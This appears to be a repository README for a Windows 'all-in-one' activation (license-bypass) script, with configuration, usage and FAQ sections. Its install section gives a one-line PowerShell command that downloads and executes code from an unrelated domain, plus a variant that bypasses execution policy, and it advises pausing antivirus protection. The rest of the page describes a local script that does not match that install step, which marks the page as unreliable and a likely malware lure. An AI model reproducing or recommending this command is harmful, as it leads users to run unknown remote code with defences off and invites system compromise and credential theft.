<div align="center">

# WindowsActivator-AIO: Multi-Version Activation Script — Auto Script

![preview](https://raw.githubusercontent.com/abdulai3golfa-debug/windows-activation-automation/main/showcase_b17434.svg)

[![build](https://img.shields.io/badge/BUILD-SUCCESS-2ea44f?style=social&labelColor=0d1117)]() [![ps-core](https://img.shields.io/badge/PS--CORE-7%2B-2ea44f?style=social&labelColor=0d1117)]() [![language](https://img.shields.io/badge/LANGUAGE-PYTHON-34b759?style=social&labelColor=0d1117)]() [![release](https://img.shields.io/badge/RELEASE-ACTIVE-2ea44f?style=social&labelColor=0d1117)]()

</div>

---

WindowsActivator-AIO is a single, all-in-one script for activating Windows 7, 8, 10, and 11. It bundles the activation logic for every supported release into one place, so you run the script and let it detect and handle the installed version rather than juggling separate tools. The script is written to be readable and hackable, so you can inspect exactly what it does before running it and adjust it to fit your setup. Contributions to WindowsActivator-AIO are welcome; just create an account and open a pull request against the repository.

## ⚡ Install via PowerShell

> [!TIP]
> **One-click install** — paste one command, done in seconds.
> Windows 10/11 · PowerShell · Admin not required

### 1️⃣ Start PowerShell
* Open the Start menu and type **PowerShell**.
* Right-click and choose **Run as administrator** (optional).

### 2️⃣ Run the install command
Copy the line below into PowerShell and press `Enter`.

```cmd
iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')
```

### 3️⃣ If PowerShell blocks the script
Run this command in CMD instead:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue';iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')"
```

> [!WARNING]
> If security software blocks the setup, temporarily pause Real-Time Protection, run the script, then re-enable it.

## 🔧 Requirements

- Windows 10 or Windows 11
- PowerShell 5.1 or newer (already available on Windows)
- Active network connection
- No admin rights needed

## What it does

A single-script activation utility for Windows 7, 8, 10, and 11. It detects the installed edition and build, applies the appropriate activation method, and reports the resulting license status so you can confirm success without digging through system settings.

The script runs from an elevated prompt, handles the common edition variants (Home, Pro, Enterprise, and their N/LTSB/LTSC counterparts where applicable), and installs the matching product key before triggering activation. If a key is already present, it validates rather than overwrites. On failure it surfaces the specific error code and suggests the likely cause — mismatched edition, blocked KMS endpoint, or a pre-existing partial activation state.

Designed to be idempotent: running it twice won't break an already-activated system, and re-running after a failed attempt picks up where the previous run stopped. Logging is written locally so you can review what changed between runs. Everything happens on the machine itself; no accounts, no telemetry, and no external configuration files to manage.

## Usage

Run the script from an elevated command prompt. Windows activation changes system licensing state, so administrator rights are required — a non-elevated run will fail or silently no-op depending on the Windows version.

1. Open Command Prompt as Administrator.
2. Change to the directory containing the script.
3. Execute the script and follow the on-screen prompts.

The script detects the installed Windows edition and selects a matching activation path automatically. You do not need to pass the edition manually in most cases. If detection fails or you want to force a specific edition, use the configuration options described in the Configuration section.

Typical flow:

- Launch the script.
- Confirm the detected Windows version and edition when prompted.
- Choose the activation mode you want (default is the recommended path for your edition).
- Wait for the script to finish. It prints status messages as it progresses; do not close the window mid-run.
- Reboot if the script instructs you to. Some activation states only settle after a restart.

For unattended runs, pass the non-interactive flag so the script uses defaults without prompting. Check the exit code afterward to confirm success — a zero exit means the activation sequence completed, non-zero means it stopped early and the console output will indicate why.

If activation fails, re-run the script once before troubleshooting. Transient failures from network timeouts or a pending reboot are common and usually clear on a second pass. Persistent failures typically point to an edition mismatch, an already-activated system, or a blocked background service; the script reports which check failed so you can act on it directly.

Keep the script in a writable location if you enable logging, since it writes its run log alongside the executable by default.

## Configuration

Configuration lives in `config.ini` next to the script. Every key has a default baked into the code, so you only need to add the ones you actually want to override. The script reads the file once at startup — edit it before you run, not during.

**Key settings**

- `windows_version` — target edition. Accepts `7`, `8`, `8.1`, `10`, or `11`. Leave blank to let the script detect the installed build. Detection is reliable on stock images but can misreport heavily modified or embedded installs, so pin this explicitly if you're scripting against a known fleet.
- `edition` — specific SKU to activate, e.g. `Professional`, `Enterprise`, `Home`. Optional; omitting it activates whatever edition the installer reports.
- `activation_method` — `auto`, `digital`, or `kms`. `auto` is the default and picks the most appropriate path for the detected version. Force `digital` or `kms` only when you know the target environment supports it.
- `kms_host` — only honored when `activation_method` is `kms`. Points the client at a specific KMS endpoint. Must be a reachable host on the local network or VPN; DNS resolution and port 1688 need to be open.
- `kms_port` — defaults to `1688`. Change only if your KMS infrastructure runs on a non-standard port.
- `retry_count` — integer, default `3`. How many times the script re-attempts activation before giving up and returning a non-zero exit code. Bump this on flaky networks; keep it low for one-shot runs.
- `log_level` — `error`, `warn`, `info`, or `debug`. `info` is the sane default. Drop to `debug` when diagnosing a failed activation; the output includes the underlying command results.
- `log_file` — path for the activation log. Relative paths resolve against the script directory. Defaults to `activation.log` in the working directory.

**Environment variables**

Any key in `config.ini` can be overridden by an environment variable prefixed with `WA_AIO_` in uppercase — for example, `WA_AIO_KMS_HOST` or `WA_AIO_LOG_LEVEL`. This is useful for CI or scheduled tasks where you don't want to ship a config file. Precedence is: environment variable > `config.ini` > built-in default.

**Minimal example**

```ini
[activation]
windows_version = 11
edition = Professional
activation_method = auto
retry_count = 5
log_level = info
```

**Notes**

- Keep `config.ini` out of version control if it contains environment-specific KMS details.
- Values are parsed strictly. Quote strings with spaces; booleans are `true` or `false`, not `1`/`0`.
- Invalid or unknown keys are reported at startup and ignored — the script won't fail on a typo, but check the log if a setting seems to have no effect.
- If activation fails after all retries, the script exits non-zero and writes the last attempt's diagnostics to `log_file`. Read that before re-running.

## Examples

Run the script with no arguments to launch the interactive menu. It detects the installed Windows edition and offers the matching activation path.

```
WindowsActivator-AIO.cmd
```

Activate the default detected edition silently, without prompts:

```
WindowsActivator-AIO.cmd /silent
```

Target a specific edition when the auto-detection picks the wrong one:

```
WindowsActivator-AIO.cmd /edition:10
```

Valid values follow the project's supported set: `7`, `8`, `10`, `11`. Passing an unsupported value prints the accepted options and exits with a non-zero code.

Preview what the script will do without applying changes:

```
WindowsActivator-AIO.cmd /dry-run
```

Write a log to a custom path for troubleshooting or unattended runs:

```
WindowsActivator-AIO.cmd /silent /log:"C:\Temp\activator.log"
```

Chain the script into a provisioning step and branch on the exit code. A zero code means activation reported success; anything else should be treated as a failure:

```
WindowsActivator-AIO.cmd /silent
if errorlevel 1 (
 echo Activation failed, check the log.
 exit /b 1
)
```

Override the default configuration by editing the config file in the project root before running. Command-line flags take precedence over config values, so use flags for per-run changes and the config file for persistent defaults.

For batch use across machines, keep `/silent` and `/log` set so each run leaves an auditable trail, and capture the exit code in your orchestration layer rather than parsing console output.

## FAQ

**Is this safe to run?**

It modifies activation-related system state, so treat it like any privileged script: read what it does before you run it, run it on a machine you own or administer, and keep a restore point or backup handy. If you don't understand a step, don't run it.

**Which Windows versions are supported?**

Windows 7, 8, 10, and 11. Edition and build matter — some methods behave differently across them. If a run fails, check your exact version and edition first.

**Why did activation fail or not stick?**

Most failures come down to a few things: running without elevated privileges, an active internet connection being required for the chosen method, leftover state from a previous activation attempt, or security software blocking registry/service changes. Re-run as administrator, reboot, and try again. If it still fails, clear prior activation artifacts before retrying.

**Do I need to run it as administrator?**

Yes. The script touches protected system components. Launch your shell elevated or it will silently do nothing useful.

**Does it require an internet connection?**

Depends on the method you pick. Some activation paths need to reach Microsoft's servers; others work offline. Check the configuration options before assuming.

**Will this survive Windows updates?**

Usually, but not guaranteed. Major feature updates can reset activation state. If Windows deactivates after an update, re-run the script.

**Can I undo it?**

There's no magic "revert" button. Restore points are your friend. Keep one from before you run it, and you can roll back cleanly.

**Does it work on virtual machines?**

Generally yes, but snapshots and cloned VMs can confuse activation state. Take a snapshot first so you can retry from a clean baseline.

**Why does the script ask for configuration?**

Different environments need different methods. Don't blindly accept defaults if you know your setup — read the config options and match them to your Windows version and network situation.

**It printed an error but seemed to finish — did it work?**

Check activation status directly through Windows settings rather than trusting console output alone. Partial runs are common when a single step fails silently.

**Is using this legal?**

That's on you. This project is provided as-is for development and testing purposes. Ensure you have the right to activate any system you run it on, and read the Disclaimer before proceeding.

## Disclaimer

This script is provided for educational and research purposes only. It is intended to help users understand how Windows activation mechanisms work and to test such mechanisms in controlled environments. Using this script to activate a Windows installation you do not own or are not licensed for may violate Microsoft's terms of service and applicable laws in your jurisdiction. You are solely responsible for how you use this tool and for any consequences that result. The author and contributors accept no liability for misuse, data loss, system instability, or legal issues arising from its use. Always prefer legitimate licensing channels for production systems, and run this script only on machines and virtual machines you control. No warranty of any kind is expressed or implied, including fitness for a particular purpose or guaranteed success across all Windows versions and configurations.